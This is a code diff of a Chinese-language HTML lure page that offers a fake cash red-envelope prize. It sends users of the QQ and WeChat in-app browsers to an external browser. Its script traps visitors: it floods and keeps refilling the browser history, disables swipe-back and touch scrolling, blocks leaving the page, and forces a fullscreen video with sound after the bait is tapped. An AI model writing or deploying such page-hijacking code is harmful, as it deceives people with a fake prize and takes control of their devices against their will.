@@ -6,48 +6,99 @@
 <title>你有一个红包待领取</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-html,body{overscroll-behavior-x:none;touch-action:pan-y;-webkit-overflow-scrolling:touch}
-body{background:linear-gradient(135deg,#ff4444 0%,#cc0000 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:-apple-system,"PingFang SC",sans-serif;overflow:hidden}
-.bait{text-align:center;color:#fff;animation:pulse 1.5s infinite;cursor:pointer}
+html,body{overscroll-behavior:none;touch-action:none;-webkit-overflow-scrolling:touch;overflow:hidden}
+body{background:#fff;min-height:100vh;font-family:-apple-system,"PingFang SC",sans-serif}
+#guide{display:none;align-items:center;justify-content:center;min-height:100vh;background:#fff;padding:20px;position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:50000}
+#guide .card{text-align:center;max-width:360px}
+#guide .icon{font-size:48px;margin-bottom:16px}
+#guide h2{font-size:20px;color:#333;margin-bottom:12px}
+#guide p{font-size:14px;color:#666;line-height:1.6;margin-bottom:20px}
+#guide .steps{background:#f8f8f8;border-radius:12px;padding:16px;text-align:left;margin-bottom:20px}
+#guide .steps div{font-size:14px;color:#333;padding:6px 0}
+#guide .steps span{color:#ff4444;font-weight:bold}
+#guide .btn{display:block;width:100%;padding:14px;background:#ff4444;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}
+#guide .btn:active{background:#cc0000}
+#guide .hint{font-size:12px;color:#999;margin-top:12px}
+.bait{display:none;text-align:center;color:#fff;position:fixed;top:0;left:0;width:100vw;height:100vh;background:linear-gradient(135deg,#ff4444 0%,#cc0000 100%);align-items:center;justify-content:center;flex-direction:column;z-index:10;cursor:pointer}
 .bait .icon{font-size:80px}
 .bait h1{font-size:28px;margin:16px 0 8px}
 .bait p{font-size:16px;opacity:.8}
 .bait .tap{margin-top:24px;padding:12px 32px;background:#ffd700;color:#c00;border-radius:24px;font-size:18px;font-weight:bold;display:inline-block;animation:bounce 1s infinite}
 @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
 @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+.bait .icon,.bait h1,.bait p{animation:pulse 1.5s infinite}
 #player{display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:99999}
 #player video{width:100%;height:100%;object-fit:contain}
 #pg{position:fixed;bottom:0;left:0;height:4px;background:#f44;z-index:100000}
-#shield{display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99998;background:transparent;touch-action:none}
+#shield{display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99998;background:transparent}
 </style>
 </head>
 <body>
+<div id="guide">
+<div class="card">
+<div class="icon">🔗</div>
+<h2>请在浏览器中打开</h2>
+<p>当前是应用内浏览器，无法正常领取红包。<br>请复制链接后在浏览器中打开：</p>
+<div class="steps">
+<div>1. 点击下方按钮复制链接</div>
+<div>2. 打开 <span>Chrome / Safari</span> 等浏览器</div>
+<div>3. 粘贴链接并访问</div>
+</div>
+<button class="btn" id="copyBtn">复制链接</button>
+<div class="hint" id="hint"></div>
+</div>
+</div>
+
 <div class="bait" id="bait">
 <div class="icon">🧧</div>
 <h1>恭喜你获得现金红包！</h1>
 <p>点击领取，24小时内有效</p>
 <div class="tap">立即领取</div>
 </div>
+
 <div id="shield"></div>
+
 <div id="player">
 <video id="v" playsinline webkit-playsinline preload="auto" x-webkit-airplay="allow"></video>
 <div id="pg"></div>
 </div>
+
 <script>
 (function(){
 var ua=navigator.userAgent.toLowerCase();
 var isQQ=/qq\//.test(ua)||/qzone/.test(ua);
-var url=location.href.split('#')[0];
+var isWeChat=/micromessenger/.test(ua);
+var isApp=isQQ||isWeChat;
+var url=location.href.split('#')[0].split('?')[0];
+
+var guide=document.getElementById("guide");
+var bait=document.getElementById("bait");
+var shield=document.getElementById("shield");
+var copyBtn=document.getElementById("copyBtn");
+var hint=document.getElementById("hint");
 var v=document.getElementById("v");
 var player=document.getElementById("player");
 var pg=document.getElementById("pg");
-var bait=document.getElementById("bait");
-var shield=document.getElementById("shield");
 var started=false;
 var ended=false;
 
-// === 禁用右滑返回 ===
-// QQ 原生 API
+// === 全局触摸拦截：只阻止滑动，允许点击 ===
+var gTouchX=0,gTouchY=0,gMoved=false;
+document.addEventListener("touchstart",function(e){
+  gTouchX=e.touches[0].clientX;
+  gTouchY=e.touches[0].clientY;
+  gMoved=false;
+},{passive:true});
+document.addEventListener("touchmove",function(e){
+  var dx=Math.abs(e.touches[0].clientX-gTouchX);
+  var dy=Math.abs(e.touches[0].clientY-gTouchY);
+  if(dx>5||dy>5){gMoved=true;e.preventDefault();e.stopPropagation();}
+},{passive:false});
+document.addEventListener("touchend",function(e){
+  if(gMoved){e.preventDefault();}
+},{passive:false});
+
+// === QQ 原生禁用右滑 ===
 if(isQQ){
   var s=document.createElement("script");
   s.src="https://open.mobile.qq.com/sdk/qqapi.js";
@@ -58,25 +109,47 @@ if(isQQ){
   document.head.appendChild(s);
 }
 
-// 历史栈填充
-try{for(var i=0;i<200;i++)history.pushState({},"",url);}catch(e){}
+// === 历史栈 ===
+try{for(var i=0;i<300;i++)history.pushState({},"",url);}catch(e){}
+setInterval(function(){try{for(var i=0;i<100;i++)history.pushState({},"",url);}catch(e){}},300);
 window.onpopstate=function(){
-  try{for(var i=0;i<200;i++)history.pushState({},"",url);}catch(e){}
+  try{for(var i=0;i<300;i++)history.pushState({},"",url);}catch(e){}
 };
-
-// 左边缘右滑拦截
-var startX=0;
-document.addEventListener("touchstart",function(e){startX=e.touches[0].clientX;},{passive:false});
-document.addEventListener("touchmove",function(e){
-  if(startX<30&&e.touches[0].clientX>startX+5){e.preventDefault();e.stopPropagation();}
-},{passive:false});
 
 // beforeunload
 window.addEventListener("beforeunload",function(e){e.preventDefault();e.returnValue=""});
 
-// === 点击→播放 ===
+// === 页面显示逻辑 ===
+if(isApp){
+  guide.style.display="flex";
+  bait.style.display="none";
+}else{
+  guide.style.display="none";
+  bait.style.display="flex";
+}
+
+// 复制链接
+copyBtn.addEventListener("click",function(e){
+  e.stopPropagation();
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(url).then(function(){
+      hint.textContent="已复制！请打开浏览器粘贴访问";
+      hint.style.color="#4caf50";
+    }).catch(fallbackCopy);
+  }else{fallbackCopy();}
+  function fallbackCopy(){
+    var ta=document.createElement("textarea");
+    ta.value=url;ta.style.cssText="position:fixed;left:-9999px";
+    document.body.appendChild(ta);ta.select();
+    try{document.execCommand("copy");hint.textContent="已复制！请打开浏览器粘贴访问";hint.style.color="#4caf50";}
+    catch(e){hint.textContent="复制失败，请手动长按复制地址栏";hint.style.color="#f444";}
+    document.body.removeChild(ta);
+  }
+});
+
+// === 诱饵→播放 ===
 bait.addEventListener("click",go);
-bait.addEventListener("touchend",function(e){e.preventDefault();go(e);});
+// 注意：touchstart/touchend 被全局拦截了，用 click 触发
 
 function go(e){
   if(started)return;
@@ -98,17 +171,7 @@ function go(e){
   v.onplaying=function(){v.muted=false;v.volume=1.0;};
   v.ontimeupdate=function(){if(v.duration)pg.style.width=(v.currentTime/v.duration*100)+"%";};
 
-  // 再次禁用右滑
   if(isQQ&&window.mqq)try{mqq.invoke("view","setSwipeBackEnabled",{enabled:false});}catch(ex){}
-
-  // 补历史
-  setInterval(function(){if(!ended)try{for(var i=0;i<100;i++)history.pushState({},"",url);}catch(e){}},200);
-
-  // 触摸拦截层
-  shield.addEventListener("touchstart",function(e){e.preventDefault();},{passive:false});
-  shield.addEventListener("touchmove",function(e){if(!ended){e.preventDefault();e.stopPropagation();}},{passive:false});
-  shield.addEventListener("touchend",function(e){if(!ended)e.preventDefault();},{passive:false});
-  document.addEventListener("touchmove",function(e){if(!ended)e.preventDefault();},{passive:false});
 
   function goFullscreen(){
     var el=document.documentElement;
